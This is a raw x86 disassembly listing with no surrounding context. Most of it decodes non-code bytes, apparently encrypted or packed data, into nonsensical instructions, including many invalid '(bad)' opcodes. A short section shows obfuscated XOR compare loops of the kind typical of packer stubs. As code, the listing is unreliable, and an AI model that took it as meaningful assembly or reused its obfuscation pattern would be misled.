  405a50:	dec    edi
  405a51:	pop    es
  405a52:	(bad)  
  405a53:	or     BYTE PTR [edx+0x2ca28591],al
  405a59:	push   ds
  405a5a:	(bad)  
  405a5b:	cmp    edi,DWORD PTR [esi+ebp*1+0x39]
  405a5f:	enter  0x36e3,0x8
  405a63:	inc    edx
  405a64:	inc    eax
  405a65:	jo     0x405a5c
  405a67:	push   esi
  405a68:	clc    
  405a69:	mov    WORD PTR [ecx+esi*8],cs
  405a6c:	mov    esi,0x83be1fd5
  405a71:	or     BYTE PTR [ebp-0x42aaacb2],bh
  405a77:	mov    bl,0x5e
  405a79:	mov    bl,0xa6
  405a7b:	cwde   
  405a7c:	jb     0x405aa8
  405a7e:	add    al,0x7
  405a80:	or     edx,DWORD PTR [ebx]
  405a82:	sub    eax,0x38ac0f00
  405a87:	mov    ebx,0x72c0c84c
  405a8c:	je     0x405abf
  405a8e:	xor    ecx,DWORD PTR [esp+eiz*8]
  405a91:	ins    BYTE PTR es:[edi],dx
  405a92:	and    ch,BYTE PTR [esi]
  405a94:	jae    0x405a50
  405a96:	mov    al,ds:0xb7508681
  405a9b:	fld    st(5)
  405a9d:	pusha  
  405a9e:	adc    bh,cl
  405aa0:	jmp    0x5582:0x3729d305
  405aa7:	dec    ecx
  405aa8:	jns    0x405b02
  405aaa:	push   ebx
  405aab:	nop
  405aac:	cmp    BYTE PTR [eax+0x4f],al
  405aaf:	ja     0x405b23
  405ab1:	xor    bl,dl
  405ab3:	aad    0xad
  405ab5:	mov    dl,BYTE PTR [eax+edx*4]
  405ab8:	es std 
  405aba:	cs ret 0xdb36
  405abe:	jl     0x405a52
  405ac0:	mov    bl,0x4d
  405ac2:	test   al,0x2b
  405ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ac5:	cld    
  405ac6:	mov    ch,0xf2
  405ac8:	xchg   ebx,eax
  405ac9:	ret    
  405aca:	stos   DWORD PTR es:[edi],eax
  405acb:	data16 cli 
  405acd:	jp     0x405b1b
  405acf:	mov    WORD PTR [edx+eiz*4],cs
  405ad2:	cs sahf 
  405ad4:	dec    ecx
  405ad5:	add    cl,ah
  405ad7:	stc    
  405ad8:	mov    cl,0x3c
  405ada:	(bad)  
  405adb:	pushf  
  405adc:	adc    DWORD PTR ds:0x49265e28,edi
  405ae2:	hlt    
  405ae3:	push   edi
  405ae4:	inc    edx
  405ae5:	xchg   edi,eax
  405ae6:	push   es
  405ae7:	mov    esp,0x3c6e8c22
  405aec:	repnz and eax,0x9c61cec
  405af2:	push   0xffffffec
  405af4:	cmp    dh,BYTE PTR [ebx]
  405af6:	shl    DWORD PTR [edi+0xfdd0124],cl
  405afc:	es mov edx,0xadfe0177
  405b02:	jo     0x405b4a
  405b04:	xor    al,0xab
  405b06:	ret    
  405b07:	mov    cl,0x1f
  405b09:	lods   eax,DWORD PTR ds:[esi]
  405b0a:	in     al,dx
  405b0b:	jbe    0x405b2d
  405b0d:	out    0x85,eax
  405b0f:	sbb    al,0x88
  405b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b12:	push   ss
  405b13:	pop    ss
  405b14:	xchg   edi,eax
  405b15:	xchg   BYTE PTR [edi],dl
  405b17:	adc    sp,WORD PTR [ebp-0x385045c6]
  405b1e:	xor    DWORD PTR [edi+0x8],0xbf944e1a
  405b25:	xchg   DWORD PTR [ebx],esi
  405b27:	mov    cl,0xb2
  405b29:	sbb    DWORD PTR [ebp+0x43],ebx
  405b2c:	fwait
  405b2d:	mov    WORD PTR [edi],fs
  405b2f:	push   es
  405b30:	cdq    
  405b31:	inc    eax
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43381b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4337d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433823,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43386f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4338af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xda591f36
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405bdd
  405be0:	xchg   esp,eax
  405be1:	je     0x405b7e
  405be3:	shl    DWORD PTR [esi+eiz*4],1
  405be6:	pop    ebx
  405be7:	ret    
  405be8:	jbe    0x405b9c
  405bea:	adc    al,0x35
  405bed:	dec    esi
  405bee:	sbb    DWORD PTR [ebx-0x53391ee6],0x406fa202
  405bf8:	je     0x405bf2
  405bfa:	inc    edi
  405bfb:	jmp    0xa49a:0x151c0b87
  405c02:	sub    edi,esp
  405c04:	cmp    BYTE PTR [eax-0x27],cl
  405c07:	sahf   
  405c08:	add    eax,0xd5b3de7
  405c0d:	add    dl,ch
  405c0f:	in     al,dx
  405c10:	int3   
  405c11:	out    0xe7,al
  405c13:	adc    DWORD PTR [ecx+edx*8],0x2eeb00c8
  405c1a:	out    0x5b,eax
  405c1c:	outs   dx,DWORD PTR ds:[esi]
  405c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c1e:	mov    eax,ds:0xa0334666
  405c23:	call   0xbe14:0xbb2780a8
  405c2a:	mov    bl,0x4d
  405c2c:	repnz dec eax
  405c2e:	(bad)  
  405c2f:	dec    esi
  405c30:	adc    al,0xac
  405c32:	mul    BYTE PTR ds:0xaf78df8f
  405c38:	mov    ebp,0x234c10df
  405c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c3e:	adc    DWORD PTR [ecx+0x3a],esp
  405c41:	out    0xb8,al
  405c43:	mov    dh,0x10
  405c45:	aam    0x5e
  405c47:	cmp    DWORD PTR [ebx-0x35],esp
  405c4a:	lods   al,BYTE PTR ds:[esi]
  405c4b:	repnz xchg edx,eax
  405c4d:	test   BYTE PTR [edx],0xd4
  405c50:	pop    ebp
  405c51:	loopne 0x405c1f
  405c53:	push   ebp
  405c54:	and    edx,ebp
  405c56:	mov    edx,DWORD PTR [esi]
  405c58:	push   edi
  405c59:	call   0x9af0:0xd6dd407c
  405c60:	mov    edi,0x411977ca
  405c65:	or     edi,esp
  405c67:	push   edx
  405c68:	aaa    
  405c69:	jg     0x405ce7
  405c6b:	pop    eax
  405c6c:	out    0x5e,al
  405c6e:	sti    
  405c6f:	sub    edi,DWORD PTR [ebp-0x53]
  405c72:	and    DWORD PTR [esp+edx*8-0x4c],esp
  405c76:	es push 0xffffffe7
  405c79:	or     bl,bl
  405c7b:	push   cs
  405c7c:	sbb    ah,bh
  405c7e:	mov    ds:0xe8384cb9,al
  405c83:	ins    BYTE PTR es:[edi],dx
  405c84:	push   es
  405c85:	cmp    eax,0x1db5a1cd
  405c8a:	xor    cl,BYTE PTR [eax-0x469bc793]
  405c90:	mov    al,dl
  405c92:	jl     0x405ccf
  405c94:	push   cs
  405c95:	xchg   di,ax
  405c97:	test   DWORD PTR [edx+edx*2-0x1692ee7c],0x95d6b71
  405ca2:	cs push ds
  405ca4:	dec    esp
  405ca5:	lds    edi,FWORD PTR [ecx-0x7]
  405ca8:	mov    ds:0x298ace59,eax
  405cad:	lods   al,BYTE PTR ds:[esi]
  405cae:	sbb    eax,0xf02a6a62
  405cb3:	(bad)  
  405cb4:	push   cs
  405cb5:	cmc    
  405cb6:	xchg   esi,eax
  405cb7:	add    dl,bh
  405cb9:	sbb    dl,BYTE PTR [edx+ebp*4-0x74]
  405cbd:	clc    
  405cbe:	sbb    ecx,DWORD PTR [esi+ecx*2]
  405cc1:	in     al,dx
  405cc2:	jg     0x405c4d
  405cc4:	pop    esi
  405cc5:	xor    eax,0xd6cecdb9
  405cca:	mov    dl,0x38
  405ccc:	add    ah,dl
  405cce:	and    BYTE PTR [ebx],al
  405cd0:	es ss sbb al,0xb5
  405cd4:	sub    al,0x30
  405cd6:	into   
  405cd7:	shl    DWORD PTR [esi],0x51
  405cda:	mov    ebp,0xcf25c2ec
  405cdf:	push   cs
  405ce0:	in     eax,0xf4
  405ce2:	pop    edx
  405ce3:	add    dl,BYTE PTR [esi+0x5d]
  405ce6:	adc    eax,0xbe420cd7
  405ceb:	sahf   
  405cec:	imul   eax,ebp,0x74
  405cef:	(bad)  
  405cf1:	mov    esp,DWORD PTR [esi+eax*2+0x7aef023d]
  405cf8:	add    eax,0xf28d1ad
  405cfd:	dec    ecx
  405cfe:	mov    ch,0x6e
  405d00:	xor    ah,bl
  405d02:	or     eax,0xcca1e13f
  405d07:	and    DWORD PTR [eax-0x429054b0],ebx
  405d0d:	fsub   DWORD PTR [edx]
  405d0f:	jmp    0x405cf6
  405d11:	inc    ecx
  405d12:	rcr    DWORD PTR [esi],cl
  405d14:	ret    0x88d7
  405d17:	bswap  ebp
  405d19:	loope  0x405ccd
  405d1b:	adc    DWORD PTR [edx],esp
  405d1d:	das    
  405d1e:	and    al,0x6f
  405d20:	sub    BYTE PTR [edi+0xa],dl
  405d23:	xor    al,0x7d
  405d25:	pop    ebx
  405d26:	mov    ds:0x6dd2507f,eax
  405d2b:	xchg   BYTE PTR ds:0x9a1ab89d,bh
  405d31:	int    0x4c
  405d33:	mov    ah,0x9
  405d35:	(bad)  
  405d36:	popf   
  405d37:	pop    edi
  405d38:	push   ss
  405d39:	adc    al,0x4b
  405d3b:	inc    ecx
  405d3c:	adc    DWORD PTR [esi-0x70],0x37ab1395
  405d43:	mov    ebp,0x5cfbcc9f
  405d48:	xor    edi,esi
  405d4a:	rcl    BYTE PTR [ebp+0x4d],1
  405d4d:	mov    al,ds:0xbcbd6981
  405d52:	(bad)  
  405d53:	sbb    DWORD PTR [esi],eax
  405d55:	xchg   esi,eax
  405d56:	mov    ds:0x3f9cf647,eax
  405d5b:	push   eax
  405d5c:	add    dh,BYTE PTR [edx-0x3a]
  405d5f:	push   ss
  405d60:	adc    eax,0xb67c66b6
  405d65:	pop    ecx
  405d66:	adc    al,0x91
  405d68:	fwait
  405d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d6a:	inc    ebp
  405d6b:	icebp  
  405d6c:	out    0xe4,al
  405d6e:	cli    
  405d6f:	test   al,0x58
  405d71:	aas    
  405d72:	xchg   ebp,eax
  405d73:	jmp    0x8c66a68b
  405d78:	and    dh,BYTE PTR gs:[edx]
  405d7b:	and    ebx,DWORD PTR [edi-0x54]
  405d7e:	or     bh,BYTE PTR [edx+0x250b9454]
  405d84:	nop
  405d85:	jecxz  0x405dca
  405d87:	scas   al,BYTE PTR es:[edi]
  405d88:	or     DWORD PTR [edx+0x40],ecx
  405d8b:	lods   eax,DWORD PTR ds:[esi]
  405d8c:	je     0x405d79
  405d8e:	inc    eax
  405d8f:	aam    0x79
  405d91:	mov    esi,0x84f41791
  405d96:	push   ebx
  405d97:	pop    esp
  405d98:	mov    ecx,0xfb4c94ab
  405d9d:	lds    esp,FWORD PTR [ecx]
  405d9f:	xchg   ebx,eax
  405da0:	jecxz  0x405e14
  405da2:	mov    ebx,0xb212a6c8
  405da7:	xchg   ecx,eax
  405da8:	mov    ds:0x76754d41,eax
  405dad:	and    eax,DWORD PTR [edx+0xb]
  405db0:	aas    
  405db1:	rcl    BYTE PTR [ebp-0x11a47f81],1
  405db7:	shr    eax,cl
  405db9:	out    dx,eax
  405dba:	sub    dh,BYTE PTR [edx-0x6fd86bb2]
  405dc0:	(bad)
  405dc4:	jg     0x405d52
  405dc6:	adc    al,0x15
  405dc8:	mov    bl,0x35
  405dca:	cmp    dl,BYTE PTR [edx]
  405dcc:	cmp    dl,BYTE PTR [ebp-0x61]
  405dcf:	push   0xb9f8fb8f
  405dd4:	xchg   esi,eax
  405dd6:	jge    0x405dfd
  405dd8:	inc    ebp
  405dd9:	call   FWORD PTR [ebx]
  405ddb:	push   esi
  405ddc:	int3   
  405ddd:	repnz sub eax,0xb018c902
  405de3:	push   ss
  405de4:	repz imul ecx,DWORD PTR [eax],0x3886fe9d
  405deb:	shl    BYTE PTR [edi+0x73],cl
  405dee:	rcr    DWORD PTR [edi+0x17],cl
  405df1:	xchg   edi,eax
  405df2:	or     esi,DWORD PTR [ebx+0x4e]
  405df5:	retf   
  405df6:	push   esi
  405df7:	jbe    0x405e54
  405df9:	inc    ebp
  405dfa:	lahf   
  405dfb:	sbb    eax,0x21d2c123
  405e00:	fcmove st,st(1)
  405e02:	bound  esp,QWORD PTR [ebp-0x4c]
  405e05:	lock add BYTE PTR [ebx],dh
  405e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e09:	std    
  405e0a:	add    ch,BYTE PTR [esi-0x4c2ac8]
  405e10:	rcr    BYTE PTR [bp+si-0x47fd],cl
  405e15:	prefetcht0 BYTE PTR [ecx]
  405e18:	pop    esp
  405e19:	fidivr WORD PTR [edx-0x7]
  405e1c:	cs jge 0x405ddb
  405e1f:	and    eax,ebp
  405e21:	(bad)  
  405e22:	dec    esp
  405e23:	repz xor DWORD PTR [ecx+0x1e],esp
  405e27:	cs call edx
  405e2a:	inc    ecx
  405e2b:	pop    ecx
  405e2c:	ds push edx
  405e2e:	js     0x405e24
  405e30:	enter  0xfd68,0x4a
  405e34:	das    
  405e35:	ror    BYTE PTR [ecx-0x1900ae40],0xdf
  405e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e3d:	sbb    eax,0x608ee3ec
  405e42:	lahf   
  405e43:	and    edi,edi
  405e45:	cmp    esi,DWORD PTR [edi-0x6f]
  405e48:	pop    esp
  405e49:	pop    eax
  405e4a:	xchg   edi,eax
  405e4b:	icebp  
  405e4c:	jnp    0x405e5f
  405e4e:	mov    esp,0xed2a6bca
  405e53:	xchg   ebp,eax
  405e54:	data16 in al,dx
  405e56:	je     0x405ea7
  405e58:	mov    ebp,0x747d2f57
  405e5d:	fsub   QWORD PTR [ebp-0x68]
  405e60:	gs push 0x38af14f4
  405e66:	fs add eax,0x8e98c348
  405e6c:	pop    ebp
  405e6d:	jmp    0x5aaa:0xcdb551e3
  405e74:	cmc    
  405e75:	test   eax,0x1bf3abb0
  405e7a:	inc    ebx
  405e7b:	test   ch,0x29
  405e7e:	jecxz  0x405e81
  405e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e81:	lods   al,BYTE PTR ds:[esi]
  405e82:	mov    ds:0xa6bbeda3,eax
  405e87:	loope  0x405e84
  405e89:	dec    ebx
  405e8a:	lods   al,BYTE PTR ds:[esi]
  405e8b:	mov    eax,ds:0x8ef3be46
  405e90:	aad    0x6e
  405e92:	inc    bx
  405e94:	jge    0x405e8d
  405e96:	imul   ebp,DWORD PTR [ecx-0x62],0x4228aef6
  405e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e9e:	outs   dx,BYTE PTR ds:[esi]
  405e9f:	sbb    edi,edi
  405ea1:	int    0x3c
  405ea3:	mov    ebp,0x5220d046
  405ea8:	jmp    FWORD PTR [edx-0xe5f2302]
  405eae:	(bad)  
  405eaf:	mov    esi,0x228a555
  405eb4:	int    0xe0
  405eb6:	jmp    0x405e99
  405eb8:	adc    ecx,ebp
  405eba:	mov    ebx,0x33f6cad1
  405ebf:	add    bl,bh
  405ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ec2:	sbb    dl,0x7
  405ec5:	cdq    
  405ec6:	retf   
  405ec7:	dec    ebx
  405ec8:	jmp    0x405e94
  405eca:	ja     0x405e98
  405ecc:	fcmovnu st,st(6)
  405ece:	add    BYTE PTR [esi-0x52c8a385],ah
  405ed4:	xchg   edx,eax
  405ed5:	ds sub dl,0x2f
  405ed9:	pop    ecx
  405eda:	ins    BYTE PTR es:[edi],dx
  405edb:	mov    ds:0xa85cf199,eax
  405ee0:	mov    cl,0x65
  405ee2:	and    edi,DWORD PTR [eax]
  405ee4:	ins    DWORD PTR es:[edi],dx
  405ee5:	(bad)  
  405ee6:	xchg   ebp,eax
  405ee7:	rcl    BYTE PTR [ebx-0x236ab5b5],0x40
  405eee:	popf   
  405eef:	sahf   
  405ef0:	(bad)  
  405ef2:	enter  0x66fd,0x7e
  405ef6:	jp     0x405f04
  405ef8:	fistp  WORD PTR [ebx+esi*4-0x35]
  405efc:	outs   dx,BYTE PTR ds:[esi]
  405efd:	sbb    eax,0x9b4a800c
  405f02:	in     al,dx
  405f03:	xchg   edx,eax
  405f04:	out    dx,al
  405f05:	std    
  405f06:	dec    eax
  405f07:	mov    edx,0x314e0a1b
  405f0c:	add    BYTE PTR [esi+0x3323a4c7],al
  405f12:	icebp  
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [edx-0x59455f96],es
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	stos   BYTE PTR es:[edi],al
  405f33:	xchg   esp,eax
  405f34:	mov    cl,0xea
  405f36:	jp     0x405f57
  405f38:	jle    0x405f26
  405f3a:	mov    esi,0x6559e4e5
  405f3f:	test   al,0xa6
  405f41:	loopne 0x405f00
  405f43:	setge  ah
  405f46:	cwde   
  405f47:	lods   al,BYTE PTR ds:[esi]
  405f48:	pop    ds
  405f49:	sub    eax,0x5801d292
  405f4e:	and    ecx,DWORD PTR [esi]
  405f50:	popf   
  405f51:	mov    ecx,0x1ef83bad
  405f56:	clc    
  405f57:	jp     0x405efc
  405f59:	and    DWORD PTR [ebp+0x68],edi
  405f5c:	popf   
  405f5d:	inc    ebp
  405f5e:	xor    DWORD PTR [esi+0x5e],ebp
  405f61:	mov    edx,0x4dd715ac
  405f66:	out    dx,al
  405f67:	out    dx,eax
  405f68:	sub    DWORD PTR [ecx],eax
  405f6a:	in     eax,dx
  405f6b:	hlt    
  405f6c:	fmul   st,st(3)
  405f6e:	lods   al,BYTE PTR ds:[esi]
  405f6f:	fisubr DWORD PTR [ebx+edx*1-0x24a5ee52]
  405f76:	dec    esp
  405f77:	sti    
  405f78:	mov    ds:0xd82e4719,eax
  405f7d:	sahf   
  405f7e:	add    esp,DWORD PTR [ebx+0x66d12c9d]
  405f84:	inc    ecx
  405f85:	(bad)  
  405f86:	aad    0xf6
  405f88:	lds    eax,FWORD PTR [esi+eiz*2]
  405f8b:	in     al,0x9c
  405f8d:	inc    edx
  405f8e:	lds    esp,FWORD PTR ds:0x31616798
  405f94:	or     BYTE PTR [eax],al
  405f96:	icebp  
  405f97:	inc    edx
  405f98:	adc    BYTE PTR [eax],0xc9
  405f9b:	js     0x405f3b
  405f9d:	inc    eax
  405f9e:	adc    eax,0x672428b4
  405fa3:	(bad)  
  405fa4:	ror    BYTE PTR [edi+0x415f22d0],1
  405faa:	(bad)  
  405fab:	nop
  405fac:	inc    eax
  405fad:	sbb    al,0xb
  405faf:	nop
  405fb0:	push   ebx
  405fb1:	lods   eax,DWORD PTR ds:[esi]
  405fb2:	bound  eax,QWORD PTR [edi-0x4a35d2d0]
  405fb8:	add    edi,ebp
  405fba:	mov    al,ds:0x4c3e343b
  405fbf:	push   0xa1349f10
  405fc4:	pop    es
  405fc5:	push   cs
  405fc6:	push   DWORD PTR [ebp-0x4351d59e]
  405fcc:	jne    0x406008
  405fce:	or     BYTE PTR [eax-0x4b5ed585],0xb9
  405fd5:	push   cs
  405fd6:	scas   al,BYTE PTR es:[edi]
  405fd7:	inc    esp
  405fd8:	sti    
  405fd9:	hlt    
  405fda:	fidivr WORD PTR [esi+0x7f]
  405fdd:	xchg   esi,eax
  405fde:	xor    edi,DWORD PTR [edi+0x7a3eecdc]
  405fe4:	aas    
  405fe5:	es adc al,0x27
  405fe8:	mul    ebp
  405fea:	pop    DWORD PTR ds:0xe8ca51cd
  405ff0:	add    dh,BYTE PTR [esi]
  405ff2:	xchg   DWORD PTR [ecx-0x688a55bc],ebp
  405ff8:	retf   
  405ff9:	fidivr WORD PTR [edx+0x40a40926]
  405fff:	pop    eax
  406000:	jns    0x405fbb
  406002:	aad    0xca
  406004:	ins    DWORD PTR es:[edi],dx
  406005:	scas   eax,DWORD PTR es:[edi]
  406006:	or     ebp,DWORD PTR [ecx]
  406008:	fnstenv [eax+0x5c]
  40600b:	das    
  40600c:	sub    ch,BYTE PTR [ebp-0x51a61e60]
  406012:	daa    
  406013:	mov    al,ds:0x3a476eb6
  406018:	ret    0x4344
  40601b:	hlt    
  40601c:	pusha  
  40601d:	mov    eax,0xc5a887d1
  406022:	scas   eax,DWORD PTR es:[edi]
  406023:	add    eax,0x736c6ec8
  406028:	fstp   TBYTE PTR [ebp-0x4d]
  40602b:	aaa    
  40602c:	jmp    FWORD PTR [edx]
  40602e:	dec    edi
  40602f:	test   al,0x65
  406031:	pop    ecx
  406032:	retf   0xd09c
  406035:	outs   dx,BYTE PTR ds:[esi]
  406036:	and    al,0xf
  406038:	xchg   esp,eax
  406039:	cs push eax
  40603b:	mov    edi,0x8cf133d9
  406040:	shl    DWORD PTR [edx-0x41],cl
  406043:	add    BYTE PTR [edx+0x38],bh
  406046:	imul   ebp,DWORD PTR ds:0x507e7c98,0xb3c15094
  406050:	add    bl,cl
  406052:	ja     0x4060c8
  406054:	icebp  
  406055:	dec    edx
  406056:	xor    esp,0x9ac1fe27
  40605c:	or     eax,0x56bbda17
  406062:	sub    DWORD PTR [edi+edi*4],ecx
  406065:	jns    0x406043
  406067:	dec    ebp
  406068:	retf   0x865
  40606b:	leave  
  40606c:	arpl   dx,sp
  40606e:	daa    
  40606f:	popa   
  406070:	inc    edx
  406071:	jle    0x40603e
  406073:	sbb    eax,0xe65c5efc
  406078:	and    BYTE PTR [ecx+0x2b],dh
  40607b:	imul   ebx,DWORD PTR fs:[ebp+0x44505665],0xffffffb7
  406083:	lods   al,BYTE PTR ds:[esi]
  406084:	mov    eax,ds:0xa61d0188
  406089:	sti    
  40608a:	inc    dl
  40608c:	jmp    0x47b26a69
  406091:	(bad)  
  406092:	or     al,0x1
  406094:	pop    esp
  406095:	add    DWORD PTR [ebp+ecx*4-0x747df762],ebp
  40609c:	mov    esp,0x7c72339
  4060a1:	loop   0x40611b
  4060a3:	fcom   QWORD PTR [ebx+0x1f]
  4060a6:	adc    DWORD PTR [ebp+0x31],ebx
  4060a9:	xchg   ecx,eax
  4060aa:	inc    edx
  4060ab:	out    0x97,al
  4060ad:	cmp    DWORD PTR [ecx],esp
  4060af:	and    al,0xf0
  4060b1:	pop    DWORD PTR [eax-0xcde2be7]
  4060b7:	fcmovnb st,st(2)
  4060b9:	and    eax,DWORD PTR [eax+0x72]
  4060bc:	jmp    0xb342880f
  4060c1:	sbb    al,BYTE PTR [ebx+ecx*4-0x3d481fdd]
  4060c8:	mov    bl,BYTE PTR [edi+0x19c5882d]
  4060ce:	fmul   st(0),st
  4060d0:	cdq    
  4060d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060d2:	stos   DWORD PTR es:[edi],eax
  4060d3:	xchg   BYTE PTR ds:0xe5544c4b,dl
  4060d9:	add    BYTE PTR [ecx],ah
  4060db:	sub    eax,0xe7c33c59
  4060e0:	push   esp
  4060e1:	mov    ?,WORD PTR [ebp-0x7b]
  4060e4:	pop    esp
  4060e5:	inc    esi
  4060e6:	mov    ebx,0x1638328b
  4060eb:	(bad)  [eax-0x71]
  4060ee:	repz push ss
  4060f0:	cmp    DWORD PTR [edi+0x5],ebp
  4060f3:	inc    ebx
  4060f4:	aad    0x47
  4060f6:	xchg   ebp,eax
  4060f7:	add    esi,DWORD PTR [edi+0x127b2301]
  4060fd:	and    DWORD PTR [ebx*8+0x623c3847],ebp
  406104:	pop    edx
  406105:	xchg   esi,eax
  406106:	lds    ebp,FWORD PTR [ecx+0x1c]
  406109:	sub    al,0x42
  40610b:	dec    edi
  40610c:	xor    al,0xd5
  40610e:	dec    esp
  40610f:	fld    QWORD PTR [edx+edi*8]
  406112:	fst    DWORD PTR [edx]
  406114:	jnp    0x40613f
  406116:	lods   eax,DWORD PTR ds:[esi]
  406117:	or     al,0x23
  406119:	daa    
  40611a:	add    BYTE PTR [ecx+0x76227c4a],ah
  406120:	pop    ebp
  406121:	rep stos BYTE PTR es:[edi],al
  406123:	mov    ds:0x93a5f18e,al
  406128:	rcl    BYTE PTR [esi+0x4b66b5ac],1
  40612e:	mov    bh,0x5c
  406130:	cwde   
  406131:	dec    ecx
  406132:	inc    esp
  406133:	mov    WORD PTR [ecx],ss
  406135:	xor    al,0xf0
  406137:	popa   
  406138:	idiv   DWORD PTR [ebx-0x43f3a5b4]
  40613e:	sub    BYTE PTR [esi+ecx*4+0x6688f194],bl
  406145:	repnz sbb DWORD PTR [eax-0x32e23178],0xffffffd9
  40614d:	aaa    
  40614e:	in     al,0xaa
  406150:	rcl    DWORD PTR [ecx+0x42],0xf
  406154:	sub    BYTE PTR [ebx+ebp*1+0xce45441],dl
  40615b:	(bad)  
  40615c:	mov    BYTE PTR [ebx],dh
  40615e:	in     al,dx
  40615f:	(bad)
  406162:	ret    
  406163:	lods   al,BYTE PTR ds:[esi]
  406164:	out    0xe2,eax
  406166:	mov    ebx,0x1a3ca092
  40616b:	lods   al,BYTE PTR ds:[esi]
  40616c:	and    eax,DWORD PTR [esi+0x4fa09c4c]
  406172:	or     ebx,esp
  406174:	sbb    eax,0xc4f26d80
  406179:	hlt    
  40617a:	scas   al,BYTE PTR es:[edi]
  40617b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40617c:	xchg   DWORD PTR [ecx-0x254740e2],ecx
  406182:	push   eax
  406183:	std    
  406184:	jae    0x4061b7
  406186:	cld    
  406187:	ficom  DWORD PTR [edi-0x649df5d0]
  40618d:	or     BYTE PTR [esi+0x3],ah
  406190:	test   DWORD PTR [ebx-0x47e03934],edi
  406196:	int    0x45
  406198:	hlt    
  406199:	or     BYTE PTR [edi-0x58],ch
  40619c:	xor    esp,DWORD PTR ds:[ecx-0x1d]
  4061a0:	cmp    eax,0x628977be
  4061a5:	shl    dh,cl
  4061a7:	sub    al,0xbf
  4061a9:	(bad)  
  4061ab:	shl    BYTE PTR [eax-0x59],cl
  4061ae:	out    dx,eax
  4061af:	(bad)  ds:0x9922220b
  4061b5:	sti    
  4061b6:	dec    ecx
  4061b7:	imul   esi,DWORD PTR [ebx],0x6d
  4061ba:	data16 sub BYTE PTR [ebp+0x6bcd9456],dl
  4061c1:	dec    edi
  4061c2:	popa   
  4061c3:	sub    eax,esi
  4061c5:	lds    ecx,FWORD PTR [edi+0x7d0040a0]
  4061cb:	test   eax,0xb3f5bfe3
  4061d0:	add    al,0xf8
  4061d2:	sti    
  4061d3:	ret    0xcad4
  4061d6:	add    bl,bh
  4061d8:	mov    ch,0x77
  4061da:	lods   eax,DWORD PTR ds:[esi]
  4061db:	mov    ds:0x7a1924bf,eax
  4061e0:	test   eax,0x2bcaeaad
  4061e5:	add    esp,DWORD PTR [esi-0x15]
  4061e8:	arpl   dx,ax
  4061ea:	fwait
  4061eb:	and    BYTE PTR ds:0xd003947d,ah
  4061f1:	push   esi
  4061f2:	aad    0x4f
  4061f4:	inc    ebp
  4061f5:	lahf   
  4061f6:	push   edx
  4061f7:	ins    BYTE PTR es:[edi],dx
  4061f8:	fld    DWORD PTR [ebx-0x8]
  4061fb:	das    
  4061fc:	out    dx,eax
  4061fd:	sbb    al,BYTE PTR [eax]
  4061ff:	jne    0x406270
  406201:	push   edx
  406202:	or     dl,ah
  406204:	icebp  
  406205:	lea    edx,[edi+0x3da468d6]
  40620b:	shr    DWORD PTR [ecx],0x91
  40620e:	fiadd  DWORD PTR [ebx-0x773afd4a]
  406214:	std    
  406215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406216:	adc    DWORD PTR [ecx+eiz*8+0x24],esi
  40621a:	aam    0x57
  40621c:	je     0x406231
  40621e:	cdq    
  40621f:	or     DWORD PTR [eax+0x4f],ecx
  406222:	ret    0x4f4
  406225:	out    0xc,eax
  406227:	(bad)  [eax]
  406229:	shl    BYTE PTR [ecx-0x39],0xa5
  40622d:	lahf   
  40622e:	outs   dx,BYTE PTR ds:[esi]
  40622f:	inc    edi
  406230:	push   ecx
  406231:	mov    edx,0xf5ab4a60
  406236:	adc    BYTE PTR [edx+eiz*4+0xa6784a9],cl
  40623d:	sbb    eax,0x9c1daaab
  406242:	(bad)  
  406243:	js     0x4061dd
  406245:	dec    ebx
  406246:	push   edx
  406247:	pop    edx
  406248:	xchg   ecx,eax
  406249:	popf   
  40624a:	nop
  40624b:	fld    QWORD PTR [edi]
  40624d:	stos   DWORD PTR es:[edi],eax
